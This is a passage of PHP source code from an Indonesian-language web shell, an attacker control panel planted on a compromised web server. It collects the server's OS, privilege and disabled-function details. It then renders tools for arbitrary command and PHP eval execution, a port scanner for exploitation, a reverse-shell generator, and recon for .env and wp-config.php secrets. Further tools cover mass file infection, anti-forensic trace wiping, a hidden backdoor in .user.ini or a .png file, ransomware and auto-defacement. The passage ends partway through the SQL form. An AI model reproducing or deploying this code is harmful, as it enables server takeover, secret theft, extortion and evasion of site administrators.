    if (stripos($wmic, 'SSD') !== false || stripos($wmic, 'Solid State') !== false)
        $drive_type = "SSD";
} else {
    // Linux heuristic based on rotational flag
    $sys_blk = SysUtils::exe("cat /sys/block/sda/queue/rotational 2>/dev/null");
    if (trim($sys_blk) === "0")
        $drive_type = "SSD (NVMe/SATA)";
    elseif (trim($sys_blk) === "1")
        $drive_type = "HDD (Rotational)";
}

$dis_funcs = @ini_get('disable_functions') ?: 'None';

// Collect System CPU & RAM Load (Platform Dependent)
$sys_load = "";
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    // Free ram in windows via wmic
    $w_ram = SysUtils::exe("wmic OS get FreePhysicalMemory /Value 2>nul");
    if (preg_match('/FreePhysicalMemory=(\d+)/i', $w_ram, $m)) {
        $sys_load .= "RAM Free: " . round($m[1] / 1024, 2) . " MB ";
    }
} else {
    // Linux generic load and ram
    $load = @sys_getloadavg();
    if ($load) {
        $sys_load .= "CPU: " . $load[0] . ", " . $load[1] . " | ";
    }
    $mem = SysUtils::exe("free -m | grep Mem");
    if (preg_match('/Mem:\s+(\d+)\s+(\d+)/', $mem, $m)) {
        $sys_load .= "RAM Use: " . $m[2] . " / " . $m[1] . " MB";
    }
}
if (!$sys_load)
    $sys_load = "N/A";

// Mengambil info User & Privilege
$user_info = SysUtils::exe("whoami 2>nul") ?: @get_current_user();
$group_info = "N/A";
if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
    $group_info = SysUtils::exe("id -gn 2>/dev/null");
    if (!$user_info)
        $user_info = SysUtils::exe("id -un 2>/dev/null");
}
$privilege = trim($user_info) . ($group_info != 'N/A' && trim($group_info) !== '' ? " (Group: " . trim($group_info) . ")" : "");

// Web Server Software
$web_server = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';

// Cek Modul PHP berharga & umum (curl, pdo, mysqli, mbstring, gd)
$important_mods = ['curl', 'pdo', 'mysqli', 'mbstring', 'gd', 'fileinfo', 'sockets', 'zip'];
$active_mods = [];
foreach ($important_mods as $mod) {
    if (extension_loaded($mod))
        $active_mods[] = $mod;
}
$mod_str = !empty($active_mods) ? implode(', ', $active_mods) : 'Minimal';

echo "<div class='sys-info' style='font-size: 13px;'>
        <div>OS: <span style='color:#00ffff;'>" . php_uname('s') . " " . php_uname('r') . " " . php_uname('v') . "</span></div>
        <div>Privilege: <span style='color:#ff00ea; font-weight:bold;'>" . htmlspecialchars($privilege) . "</span></div>
        <div title='Web Server Engine'>Server: <span style='color:#ffaa00;'>" . htmlspecialchars(substr($web_server, 0, 30)) . "</span></div>
        <div>PHP: <span style='color:#00ff00;'>" . phpversion() . "</span></div>
        <div>IP Server: <span style='color:#bb88ff;'>" . $_SERVER['SERVER_ADDR'] . "</span></div>
        <div>IP Kamu: <span>" . $_SERVER['REMOTE_ADDR'] . "</span></div>
        <div title='Hard-Drive / Solid-State Drive Type'>Storage ($drive_type): <span id='rt_hdd' style='color:#00bfff;'>$disk_free / $disk_total</span></div>
        <div title='Server Memory usage and Load Avg'>Server Load: <span id='rt_load' style='color:#ffff00;'><span id='rt_load_data'>$sys_load</span></span></div>
        <div title='Important extensions loaded'>Active Mods: <span style='color:#ff4444;'>" . htmlspecialchars($mod_str) . "</span></div>
        <div>Disabled Funcs: <span style='color:red; max-width:150px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;' title='" . htmlspecialchars($dis_funcs) . "'>" . htmlspecialchars($dis_funcs) . "</span></div>
        <div>Time (<span style='color:#aaa; font-size:10px;'>" . date_default_timezone_get() . "</span>): <span id='client_time' style='color:#fff;'>Loading...</span></div>
      </div>";

if (isset($msg))
    echo "<div class='message'>$msg</div>";

// Block Trigger Buttons for Tools Modal (Above Table)
echo "<div class='tools-btn-group'>
        <button class='tool-trigger-btn' onclick='openToolModal(\"cmd\")' onmouseover=\"setHud('<b style=\'color:#00bfff;\'>[>_] COMMAND</b>: Fungsi Terminal lokal. Gunakan ini untuk menjalankan perintah OS (seperti: <i>ls -la, pwd, whoami</i>) secara remote di server ini.')\" onmouseout='resetHud()'>[>_] COMMAND</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"eval\")' style='color:#ffaa00; border-color:#ffaa00;' onmouseover=\"setHud('<b style=\'color:#ffaa00;\'>[PHP] EVAL CODE</b>: Area Sandbox PHP. Anda bisa menulis script PHP dan mengeksekusinya langsung melalui browser tanpa membikin file baru.')\" onmouseout='resetHud()'>[PHP] EVAL CODE</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"sql\")' style='color:#ff00ea; border-color:#ff00ea;' onmouseover=\"setHud('<b style=\'color:#ff00ea;\'>[SQL] DB MANAGER</b>: Aplikasi SQL terintegrasi untuk membaca data, mengedit baris, mengatur tabel, atau mengontrol Database server jarak jauh.')\" onmouseout='resetHud()'>[SQL] DB MANAGER</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"scan\")' style='color:#00ffff; border-color:#00ffff;' onmouseover=\"setHud('<b style=\'color:#00ffff;\'>[NET] SCANNER</b>: Radar jaringan port. Melacak dan men-scan celah keamanan pada port di alamat IP Web yang ditargetkan untuk di-exploitasi.')\" onmouseout='resetHud()'>[NET] SCANNER</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"upload\")' onmouseover=\"setHud('<b>[^] UPLOAD</b>: Fitur unggah. Pindahkan file seperti script deface, gambar, atau zip dari PC / HP Kamu ke dalam server ini.')\" onmouseout='resetHud()'>[^] UPLOAD</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"create\")' onmouseover=\"setHud('<b>[+] CREATE ITEM</b>: Membuat ruangan / file kosong baru (contoh: html, php, txt, atau Folder direktori biasa) pada server secara cepat.')\" onmouseout='resetHud()'>[+] CREATE ITEM</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"archive\")' onmouseover=\"setHud('<b>[ZIP] ARCHIVE</b>: Alat kompresor server. Fitur ini akan menyatukan isi file di folder tersebut ke bungkus 1 file berformat ZIP.')\" onmouseout='resetHud()'>[ZIP] ARCHIVE</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"rs\")' style='color:#ff4444; border-color:#ff4444;' onmouseover=\"setHud('<b style=\'color:#ff4444;\'>[!] REV SHELL</b>: Memanggil koneksi <i>Reverse Shell</i> langsung ke server (Netcat/Python/Bash) guna mem-bypass Firewall jaringan.')\" onmouseout='resetHud()'>[!] REV SHELL</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"recon\")' style='color:#00ffff; border-color:#00ffff;' onmouseover=\"setHud('<b style=\'color:#00ffff;\'>[?] AUTO RECON</b>: Modul mata-mata (Spy). Akan mengumpulkan Info sensitif server dan mencarikan file kunci seperti <i>.env</i> dan <i>wp-config.php</i>.')\" onmouseout='resetHud()'>[?] AUTO RECON</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"proc\")' style='color:#ffff00; border-color:#ffff00;' onmouseover=\"setHud('<b style=\'color:#ffff00;\'>[#] TASK MGR</b>: Memantau daftar proses background server berbasis teks, cari PID nya, lalu paksa bunuh/Matikan service berjalan tersebut (Kill Process).')\" onmouseout='resetHud()'>[#] TASK MGR</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"inject\")' style='color:#bb88ff; border-color:#bb88ff;' onmouseover=\"setHud('<b style=\'color:#bb88ff;\'>[⚙] INJECTOR</b>: Mass Deface / Infection. Menyuntikkan virus/script buatan Anda ke ribuan file secara rahasia dan seketika (Otomatis se-direktori).')\" onmouseout='resetHud()'>[⚙] INJECTOR</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"defense\")' style='color:#ff0088; border-color:#ff0088; text-shadow:0 0 5px #ff0088;' onmouseover=\"setHud('<b style=\'color:#ff0088;\'>[X] SELF DEFENSE</b>: Sistem perlindungan Anti-Forensik diri. Mengelabui deteksi Admin (Ganti tanggal rilis asli) dan menghapus jejak Anda di server.')\" onmouseout='resetHud()'>[X] SELF DEFENSE</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"ghost\")' style='color:#00ff00; border-color:#00ff00; background:rgba(0,255,0,0.1); text-shadow:0 0 5px #00ff00; box-shadow:0 0 10px rgba(0,255,0,0.2); border-width:2px;' onmouseover=\"setHud('<b style=\'color:#00ff00;\'>[☢] GHOST ROOTKIT</b>: Fitur Tingkat Dewa! Pasang backdoor FUD (Fully Undetectable) yang kebal WAF via <i>.user.ini</i> atau file gambar <i>.png</i> siluman.')\" onmouseout='resetHud()'>[☢] GHOST ROOTKIT</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"ransomware\")' style='color:#ff0000; border-color:#ff0000; background:rgba(255,0,0,0.1); text-shadow:0 0 5px #ff0000; box-shadow:0 0 10px rgba(255,0,0,0.2); border-width:2px;' onmouseover=\"setHud('<b style=\\'color:#ff0000;\\'>[!] RANSOMWARE</b>: Mengenkripsi (Lock) file atau folder penting secara massal dan pasang Pesan Peringatan. Pastikan mengingat Kunci Dekripsinya agar bisa dibuka kembali.')\" onmouseout='resetHud()'>[!] RANSOMWARE</button>
        <button class='tool-trigger-btn' onclick='openToolModal(\"deface\")' style='color:#ff0000; border-color:#ff0000; background:rgba(255,0,0,0.1); text-shadow:0 0 5px #ff0000; box-shadow:0 0 10px rgba(255,0,0,0.2); border-width:2px;' onmouseover=\"setHud('<b style=\'color:#ff0000;\'>[☠] AUTO DEFACER</b>: Deteksi Massal file index utama pada direktori beserta isinya, lalu timpa dengan Script Deface Anda secara brutal & otomatis.')\" onmouseout='resetHud()'>[☠] AUTO DEFACER</button>
      </div>";

// Panel Informasi HUD (Instruksi Interaktif)
echo "<div id='hud_info' style='margin-bottom:20px; border:1px dashed #00bfff; background:#080808; padding:15px; border-radius:5px; box-shadow:inset 0 0 10px rgba(0,191,255,0.1); display:flex; align-items:flex-start; min-height:45px; transition:0.3s;'>
        <div style='font-weight:bold; color:#00bfff; font-size:20px; margin-right:15px; flex-shrink:0;'>[!]</div>
        <div id='hud_text' style='color:#ccc; font-size:13px; font-family:\"Courier New\", monospace; line-height:1.5; display:block; word-wrap:break-word; word-break:break-word;'>
           <span style='color:#00ff00;'>Arahkan kursor Anda ke deretan tombol menu maupun action file untuk melihat Penjelasan (Tutorial) cara pemakaian secara otomatis di area ini.</span>
        </div>
      </div>";

$files = SysUtils::get_dir_files($dir_real);

$sort = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$order = isset($_GET['order']) && $_GET['order'] === 'desc' ? 'desc' : 'asc';
$next_order = $order === 'asc' ? 'desc' : 'asc';

echo "<div class='table-responsive' style='background: #151515; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);'>
      <table style='width: 100%; border-collapse: separate; border-spacing: 0; min-width: 800px; font-size: 13px;'>
        <thead style='background: #111;'>
        <tr>
            <th style='border-top-left-radius: 8px; width:40px; text-align:center;'><input type='checkbox' id='selectAllBtn' onclick='toggleSelectAll(this)' title='Select All' style='accent-color:#00ff00; transform:scale(1.2); cursor:pointer;'></th>
            <th><a href='?dir=" . urlencode($dir_real) . "&sort=name&order=$next_order' style='color:#00bfff; display:block;'>Name " . ($sort == 'name' ? ($order == 'asc' ? '▲' : '▼') : '') . "</a></th>
            <th><a href='?dir=" . urlencode($dir_real) . "&sort=type&order=$next_order' style='color:#00bfff; display:block;'>Type " . ($sort == 'type' ? ($order == 'asc' ? '▲' : '▼') : '') . "</a></th>
            <th><a href='?dir=" . urlencode($dir_real) . "&sort=size&order=$next_order' style='color:#00bfff; display:block;'>Size " . ($sort == 'size' ? ($order == 'asc' ? '▲' : '▼') : '') . "</a></th>
            <th style='border-top-right-radius: 8px;'><a href='?dir=" . urlencode($dir_real) . "&sort=perms&order=$next_order' style='color:#00bfff; display:block;'>Permissions " . ($sort == 'perms' ? ($order == 'asc' ? '▲' : '▼') : '') . "</a></th>
        </tr>
        </thead>
        <tbody>";

// Tambahkan link folder '..' untuk kembali
$parent_dir = dirname($dir_real);
echo "<tr style='background: #1a1a1a;'>
        <td style='border-bottom: 1px dashed #333;'></td>
        <td style='border-bottom: 1px dashed #333;'><a href='?dir=" . urlencode($parent_dir) . "' class='dir' title='Kembali ke folder sebelumnya (Go Up)'>[ .. ]</a></td>
        <td style='border-bottom: 1px dashed #333; color:#aaa;'>UP</td>
        <td style='border-bottom: 1px dashed #333; color:#aaa;'>-</td>
        <td class='perms' style='border-bottom: 1px dashed #333;'>-</td>
      </tr>";

if (is_array($files)) {
    $file_list = [];
    foreach ($files as $file) {
        if ($file === '.' || $file === '..')
            continue;
        $full_path = $dir_real . DIRECTORY_SEPARATOR . $file;
        $is_dir = @is_dir($full_path);

        $size_raw = $is_dir ? -1 : (@file_exists($full_path) ? @filesize($full_path) : 0);
        $size_fmt = $is_dir ? "-" : $size_raw . " B";

        $file_list[] = [
            'name' => $file,
            'is_dir' => $is_dir,
            'path' => $full_path,
            'size_raw' => $size_raw,
            'size_fmt' => $size_fmt,
            'perms' => SysUtils::getPerms($full_path)
        ];
    }

    // Sorting logic
    usort($file_list, function ($a, $b) use ($sort, $order) {
        // Keep directories on top if sorting by something other than type
        if ($sort !== 'type' && $a['is_dir'] !== $b['is_dir']) {
            return $a['is_dir'] ? -1 : 1;
        }

        $cmp = 0;
        if ($sort === 'name') {
            $cmp = strnatcasecmp($a['name'], $b['name']);
        } elseif ($sort === 'type') {
            $cmp = strcmp($a['is_dir'] ? 'DIR' : 'FILE', $b['is_dir'] ? 'DIR' : 'FILE');
            if ($cmp === 0)
                $cmp = strnatcasecmp($a['name'], $b['name']); // Fallback to name
        } elseif ($sort === 'size') {
            $cmp = $a['size_raw'] - $b['size_raw'];
        } elseif ($sort === 'perms') {
            $cmp = strcmp($a['perms'], $b['perms']);
        }

        return $order === 'asc' ? $cmp : -$cmp;
    });

    // Row rendering toggle for striping effect
    $row_count = 0;

    foreach ($file_list as $f) {
        $file = $f['name'];
        $full_path = $f['path'];
        $is_dir = $f['is_dir'];

        $link = "?dir=" . urlencode($is_dir ? $full_path : $dir_real);
        $class = $is_dir ? "dir" : "file";
        $type = $is_dir ? "<span style='color:#00bfff; font-weight:bold;'>DIR</span>" : "<span style='color:#eee;'>FILE</span>";
        $size = $f['size_fmt'];
        $perms = $f['perms'];

        $row_bg = $row_count % 2 === 0 ? "background: #111;" : "background: #0d0d0d;";
        $row_count++;

        $name_html = $is_dir ? "<a href='$link' class='$class'>$file/</a>" : "<span class='$class'>$file</span>";
        echo "<tr style='$row_bg transition: all 0.2s;' onmouseover=\"this.style.background='#1a1a1a';\" onmouseout=\"this.style.background='" . ($row_count % 2 === 1 ? '#111' : '#0d0d0d') . "';\">
                <td style='border-bottom: 1px dashed #333; border-right: 1px dashed #222; text-align:center;'><input type='checkbox' class='item-check' data-is-dir='" . ($is_dir ? '1' : '0') . "' value='" . htmlspecialchars($file, ENT_QUOTES) . "' style='accent-color:#00ff00; transform:scale(1.2); cursor:pointer;'></td>
                <td style='border-bottom: 1px dashed #333; border-right: 1px dashed #222;'>$name_html</td>
                <td style='border-bottom: 1px dashed #333; border-right: 1px dashed #222;'>$type</td>
                <td style='border-bottom: 1px dashed #333; border-right: 1px dashed #222;'>$size</td>
                <td class='perms' style='border-bottom: 1px dashed #333;'>$perms</td>
              </tr>";
    }
} else {
    echo "<tr><td colspan='5' style='text-align:center; padding:20px; color:red; background: #111; border-radius: 0 0 8px 8px;'>Permission denied / Folder tidak dapat diakses!</td></tr>";
}
echo "</tbody></table></div>";

echo "<div id='mass_action_panel' style='background:#111; padding:15px; border:1px dashed #333; margin-bottom:20px; display:flex; align-items:center; justify-content:flex-start; gap:10px; flex-wrap:wrap;'>
        <b style='color:#00bfff; font-size:14px; margin-right:10px;'>Action:</b>
        <button class='action-btn action-view' onclick='executeAction(\"view\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#00bfff;\'>[VIEW]</b>: Sekedar membuka dan melihat teks kode tulisan yang ada di dalam file ini.')\" onmouseout='resetHud()'>[VIEW]</button>
        <button class='action-btn action-edit' onclick='executeAction(\"edit\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#ffaa00;\'>[EDIT]</b>: Mengubah dan menulis ulang script / teks dalam file ini.')\" onmouseout='resetHud()'>[EDIT]</button>
        <button class='action-btn action-rename' onclick='executeAction(\"rename\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#00ff00;\'>[RN] RENAME</b>: Mengganti nama file / folder terpilih.')\" onmouseout='resetHud()'>[RN]</button>
        <button class='action-btn action-cp' onclick='executeAction(\"copy\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#ff00ea;\'>[CP] COPY</b>: Menduplikasi / Menyalin file atau folder ke lokasi lain.')\" onmouseout='resetHud()'>[CP]</button>
        <button class='action-btn action-mv' onclick='executeAction(\"move\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#ffab00;\'>[MV] MOVE</b>: Memindahkan (Cut/Move) letak file / folder ke direktori lain.')\" onmouseout='resetHud()'>[MV]</button>
        <button class='action-btn action-chmod' onclick='executeAction(\"chmod\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#bb88ff;\'>[CH] CHMOD</b>: Mengganti Perizinan Hak Akses (misal 0777).')\" onmouseout='resetHud()'>[CH]</button>
        <button class='action-btn action-hash' onclick='executeAction(\"hash\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#00ffff;\'>[HASH]</b>: Menampilkan Hash keamanan (MD5, SHA1).')\" onmouseout='resetHud()'>[HASH]</button>
        <button class='action-btn action-dl' onclick='executeAction(\"download\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#ffff00;\'>[DL] DOWNLOAD</b>: Mengunduh isi file.')\" onmouseout='resetHud()'>[DL]</button>
        <button class='action-btn action-del' onclick='executeAction(\"delete\")' style='font-size:14px; padding:6px 12px;' onmouseover=\"setHud('<b style=\'color:#ff4444;\'>[DEL] DELETE</b>: Menghapus data permanen. Aksi massal.')\" onmouseout='resetHud()'>[DEL]</button>
      </div>";

$cmd_output_html = '';
$open_cmd_modal = false;
$cmd_title = "ADVANCED TOOLS";

// Cek dan tampilkan hasil dari eksekusi command POST sebelumnya
if (isset($_SESSION['cmd_out_text'])) {
    $c_text = $_SESSION['cmd_out_text'];
    $c_req = $_SESSION['cmd_request'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div style='color:#bbb; margin-bottom:5px;'>Executing: <code style='color:#00ff00;'>$c_req</code></div>
                            <pre id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; color:#ccc; border:1px dashed #333; padding:10px; width:100%; box-sizing:border-box; background:#050505; white-space:pre-wrap; word-wrap:break-word;'>" . $c_text . "</pre>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "COMMAND EXECUTION";

    // Hapus dari sesi setelah ditampilkan sehingga refresh biasa tidak akan membukanya 2x
    unset($_SESSION['cmd_out_text']);
    unset($_SESSION['cmd_request']);
} elseif (isset($_SESSION['eval_out_text'])) {
    $e_text = $_SESSION['eval_out_text'];
    $e_req = $_SESSION['eval_request'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div style='color:#bbb; margin-bottom:5px;'>PHP Eval Executing: <code style='color:#ffaa00;'>" . htmlspecialchars(strlen($e_req) > 50 ? substr($e_req, 0, 50) . "..." : $e_req) . "</code></div>
                            <pre id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; color:#ccc; border:1px dashed #333; padding:10px; width:100%; box-sizing:border-box; background:#050505; white-space:pre-wrap; word-wrap:break-word;'>" . $e_text . "</pre>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "PHP EVAL RESULT";

    unset($_SESSION['eval_out_text']);
    unset($_SESSION['eval_request']);
} elseif (isset($_SESSION['sql_out_text'])) {
    $sq_text = $_SESSION['sql_out_text'];
    $sq_req = $_SESSION['sql_request'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div style='color:#bbb; margin-bottom:5px;'>SQL Query Executing: <code style='color:#ff00ea;'>" . htmlspecialchars(strlen($sq_req) > 50 ? substr($sq_req, 0, 50) . "..." : $sq_req) . "</code></div>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #ff00ea; padding:10px; width:100%; box-sizing:border-box;'>$sq_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "SQL MANAGER RESULT";

    unset($_SESSION['sql_out_text']);
    unset($_SESSION['sql_request']);
} elseif (isset($_SESSION['scan_out_text'])) {
    $sc_text = $_SESSION['scan_out_text'];
    $sc_req = $_SESSION['scan_request'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div style='color:#bbb; margin-bottom:5px;'>Scan Result for: <code style='color:#00ffff;'>" . htmlspecialchars($sc_req) . "</code></div>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #00ffff; padding:10px; width:100%; box-sizing:border-box;'>$sc_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "NETWORK SCANNER RESULT";

    unset($_SESSION['scan_out_text']);
    unset($_SESSION['scan_request']);
} elseif (isset($_SESSION['rs_out_text'])) {
    $rs_text = $_SESSION['rs_out_text'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #ff4444; padding:10px; width:100%; box-sizing:border-box;'>$rs_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "REVERSE SHELL GENERATOR";

    unset($_SESSION['rs_out_text']);
} elseif (isset($_SESSION['recon_out_text'])) {
    $recon_text = $_SESSION['recon_out_text'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #00ffff; padding:10px; width:100%; box-sizing:border-box;'>$recon_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "SERVER AUTO RECONNAISSANCE";

    unset($_SESSION['recon_out_text']);
} elseif (isset($_SESSION['defense_out_text'])) {
    $def_text = $_SESSION['defense_out_text'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #ff0088; padding:10px; width:100%; box-sizing:border-box;'>$def_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "SELF-DEFENSE PROTOCOL";

    unset($_SESSION['defense_out_text']);
} elseif (isset($_SESSION['ghost_out_text'])) {
    $ghost_text = $_SESSION['ghost_out_text'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #00ff00; padding:10px; width:100%; box-sizing:border-box;'>$ghost_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "GHOST ROOTKIT";

    unset($_SESSION['ghost_out_text']);
} elseif (isset($_SESSION['proc_out_text'])) {
    $proc_text = $_SESSION['proc_out_text'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            $proc_text
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "PROCESS MANAGER";

    unset($_SESSION['proc_out_text']);
} elseif (isset($_SESSION['inject_out_text'])) {
    $inj_text = $_SESSION['inject_out_text'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #bb88ff; padding:10px; width:100%; box-sizing:border-box;'>$inj_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "PERSISTENCE INJECTOR";

    unset($_SESSION['inject_out_text']);
} elseif (isset($_SESSION['ransom_out_text'])) {
    $ransom_text = $_SESSION['ransom_out_text'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #ff0000; padding:10px; width:100%; box-sizing:border-box;'>$ransom_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "RANSOMWARE PROTOCOL RESULT";

    unset($_SESSION['ransom_out_text']);
} elseif (isset($_SESSION['deface_out_text'])) {
    $def_text = $_SESSION['deface_out_text'];
    $cmd_output_html = "<div style='margin-bottom:15px;' id='cmd_result'>
                            <div id='cmd_result_text' class='editor-area cmd-scroll' style='min-height:200px; max-height:55vh; overflow-y:auto; overflow-x:auto; background:#111; border:1px dashed #ff0000; padding:10px; width:100%; box-sizing:border-box;'>$def_text</div>
                        </div>";
    $open_cmd_modal = true;
    $cmd_title = "AUTO DEFACER RESULT";

    unset($_SESSION['deface_out_text']);
}

$tools_modal_display = $open_cmd_modal ? 'flex' : 'none';
$cmd_form_display = ($open_cmd_modal && $cmd_title === "COMMAND EXECUTION") ? 'block' : 'none';
$eval_form_display = ($open_cmd_modal && $cmd_title === "PHP EVAL RESULT") ? 'block' : 'none';
$sql_form_display = ($open_cmd_modal && $cmd_title === "SQL MANAGER RESULT") ? 'block' : 'none';
$scan_form_display = ($open_cmd_modal && $cmd_title === "NETWORK SCANNER RESULT") ? 'block' : 'none';
$rs_form_display = ($open_cmd_modal && $cmd_title === "REVERSE SHELL GENERATOR") ? 'block' : 'none';
$recon_form_display = ($open_cmd_modal && $cmd_title === "SERVER AUTO RECONNAISSANCE") ? 'block' : 'none';
$defense_form_display = ($open_cmd_modal && $cmd_title === "SELF-DEFENSE PROTOCOL") ? 'block' : 'none';
$ghost_form_display = ($open_cmd_modal && $cmd_title === "GHOST ROOTKIT") ? 'block' : 'none';
$proc_form_display = ($open_cmd_modal && $cmd_title === "PROCESS MANAGER") ? 'block' : 'none';
$inject_form_display = ($open_cmd_modal && $cmd_title === "PERSISTENCE INJECTOR") ? 'block' : 'none';
$ransom_form_display = ($open_cmd_modal && $cmd_title === "RANSOMWARE PROTOCOL RESULT") ? 'block' : 'none';
$deface_form_display = ($open_cmd_modal && $cmd_title === "AUTO DEFACER RESULT") ? 'block' : 'none';

$cr_h = isset($_SESSION['sql_cr']['host']) ? htmlspecialchars($_SESSION['sql_cr']['host']) : 'localhost';
$cr_u = isset($_SESSION['sql_cr']['user']) ? htmlspecialchars($_SESSION['sql_cr']['user']) : 'root';
$cr_p = isset($_SESSION['sql_cr']['pass']) ? htmlspecialchars($_SESSION['sql_cr']['pass']) : '';
$cr_d = isset($_SESSION['sql_cr']['db']) ? htmlspecialchars($_SESSION['sql_cr']['db']) : '';

// Modal Container for Tools (Hidden by default)
echo "<div id='tools_modal' class='modal-overlay' style='display:$tools_modal_display;'>
        <div class='modal-content' style='height: auto; max-width: 600px; min-height: unset;'>
            <div class='modal-header'>
                <h3 id='tools_modal_title' style='color:#00bfff;'>>> $cmd_title</h3>
            </div>
            <div class='modal-body' style='background: #0c0c0c; display: flex; flex-direction: column; gap: 20px;'>
                
                $cmd_output_html

                <!-- CMD Form -->
                <div id='tool_cmd' style='display:$cmd_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Target: <b>$display_path</b></label>
                        <div style='display:flex; align-items:center; gap:10px; width:100%; box-sizing:border-box;'>
                            <span style='white-space:nowrap; color:#00bfff; font-weight:bold;'>root@server:~#</span>
                            <input type='text' name='cmd' id='cmd_input' " . ($open_cmd_modal && $cmd_title !== "PHP EVAL RESULT" ? "autofocus" : "") . " placeholder='Bisa pakai perintah linux/windows...' autocomplete='off' style='flex-grow:1; margin:0; min-width:0;'>
                        </div>
                        <button type='submit' style='width:100%;'>EXECUTE COMMAND</button>
                    </form>
                </div>
                
                <!-- EVAL Form -->
                <div id='tool_eval' style='display:$eval_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>Evaluate PHP Code (No need &lt;?php ?&gt;): <b>$display_path</b></label>
                        <textarea name='eval_code' id='eval_input' class='editor-area cmd-scroll' style='min-height:150px; background:#111; color:#ffaa00; border:1px dashed #ffaa00;' placeholder='echo \"Hello World!\";' required " . ($open_cmd_modal && $cmd_title === "PHP EVAL RESULT" ? "autofocus" : "") . "></textarea>
                        <button type='submit' style='width:100%; background:#ffaa00; color:#000;'>EXECUTE PHP SOURCE</button>
                    </form>
                </div>
                
                <!-- SQL Form -->
                <div id='tool_sql' style='display:$sql_form_display;'>
                    <form method='post' style='display:flex; flex-direction:column; gap:15px; margin:0;'>
                        <label style='color:#bbb;'>SQL DB Explorer (requires PDO): <b>MySQL / MariaDB</b></label>
                        <div style='display:flex; flex-wrap:wrap; gap:10px; width:100%; box-sizing:border-box;'>
                            <input type='text' name='sql_host' placeholder='Host (def: localhost)' value='$cr_h' style='flex:1; min-width:100px; border:1px dashed #ff00ea; color:#ff00ea;' required>
